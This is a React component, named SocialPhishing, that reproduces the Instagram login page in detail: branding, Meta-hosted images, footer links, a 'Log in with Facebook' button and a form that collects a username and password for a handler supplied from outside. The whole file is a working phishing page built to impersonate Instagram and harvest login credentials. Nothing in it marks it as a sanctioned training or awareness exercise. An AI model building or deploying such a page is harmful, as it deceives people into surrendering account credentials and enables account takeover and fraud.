'use client';

import { useState } from 'react';

export default function SocialPhishing({ formData, handleChange, handleSubmit, loading }) {
  const [showPassword, setShowPassword] = useState(false);

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-white px-4 py-8">
      <div className="w-full max-w-[350px]">
        {/* Instagram-style card */}
        <div className="border border-gray-300 bg-white p-8 sm:rounded-sm">
          {/* Logo */}
          <div className="mb-8 text-center">
            <h1 className="text-5xl text-gray-900" style={{ fontFamily: 'var(--font-grand-hotel), cursive' }}>Instagram</h1>
            <p className="mt-4 text-center text-gray-500 font-semibold text-lg leading-6">Sign in to continue to Instagram</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-2">
            {/* Username field */}
            <div className="relative">
              <input
                name="username"
                type="text"
                required
                value={formData.username || ''}
                onChange={handleChange}
                placeholder="Phone number, username, or email"
                className="w-full rounded-sm border border-gray-300 bg-gray-50 px-2 py-2.5 text-xs text-gray-900 placeholder-gray-500 focus:border-gray-400 focus:outline-none focus:ring-0"
              />
            </div>

            {/* Password field */}
            <div className="relative flex items-center">
              <input
                name="password"
                type={showPassword ? "text" : "password"}
                required
                value={formData.password || ''}
                onChange={handleChange}
                placeholder="Password"
                className="w-full rounded-sm border border-gray-300 bg-gray-50 px-2 py-2.5 text-xs text-gray-900 placeholder-gray-500 focus:border-gray-400 focus:outline-none focus:ring-0"
              />
              {formData.password && (
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 text-sm font-semibold text-gray-900 hover:text-gray-500"
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              )}
            </div>

            {/* Continue button */}
            <div className="pt-2">
              <button
                type="submit"
                disabled={loading}
                className="w-full rounded bg-[#0095f6] py-1.5 text-sm font-semibold text-white hover:bg-[#1877f2] disabled:opacity-70"
              >
                {loading ? 'Logging in...' : 'Continue'}
              </button>
            </div>
          </form>

          {/* Divider */}
          <div className="my-5 flex items-center">
            <div className="h-px flex-1 bg-gray-300"></div>
            <div className="px-4 text-xs font-semibold text-gray-500">OR</div>
            <div className="h-px flex-1 bg-gray-300"></div>
          </div>

          {/* Facebook Login */}
          <div className="text-center">
            <button type="button" className="flex items-center justify-center w-full text-sm font-semibold text-[#385185] hover:text-[#385185]/80">
              <svg className="mr-2 h-4 w-4 fill-current" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
              </svg>
              Log in with Facebook
            </button>
          </div>

          {/* Forgot password */}
          <div className="mt-4 text-center">
            <a href="#" className="text-xs text-[#00376b]">Forgot password?</a>
          </div>
        </div>

        {/* Sign up box */}
        <div className="mt-2.5 border border-gray-300 bg-white p-5 text-center sm:rounded-sm">
          <p className="text-sm text-gray-600">
            Don't have an account?{' '}
            <a href="#" className="font-semibold text-[#0095f6]">Sign up</a>
          </p>
        </div>

        {/* Get the app */}
        <div className="mt-5 text-center">
          <p className="text-sm text-gray-600">Get the app.</p>
          <div className="mt-3 flex justify-center gap-2">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Get it on Google Play" className="h-10" />
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft" className="h-10" />
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="mt-12 w-full max-w-4xl px-4">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-xs text-gray-500">
          <a href="#" className="hover:underline">Meta</a>
          <a href="#" className="hover:underline">About</a>
          <a href="#" className="hover:underline">Blog</a>
          <a href="#" className="hover:underline">Jobs</a>
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">API</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Top Accounts</a>
          <a href="#" className="hover:underline">Locations</a>
          <a href="#" className="hover:underline">Instagram Lite</a>
          <a href="#" className="hover:underline">Threads</a>
          <a href="#" className="hover:underline">Contact Uploading & Non-Users</a>
          <a href="#" className="hover:underline">Meta Verified</a>
        </div>
        <div className="mt-4 flex items-center justify-center gap-4 text-xs text-gray-500">
          <select className="bg-transparent outline-none cursor-pointer">
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
          </select>
          <div className="flex items-center gap-1">
            <span>© 2024 Instagram from</span>
            <img src="https://static.cdninstagram.com/rsrc.php/yv/r/BTfW9s135jP.ico" alt="Meta" className="h-3 w-3 opacity-70" />
            <span>Meta</span>
          </div>
        </div>
      </div>
    </div>
  );
}
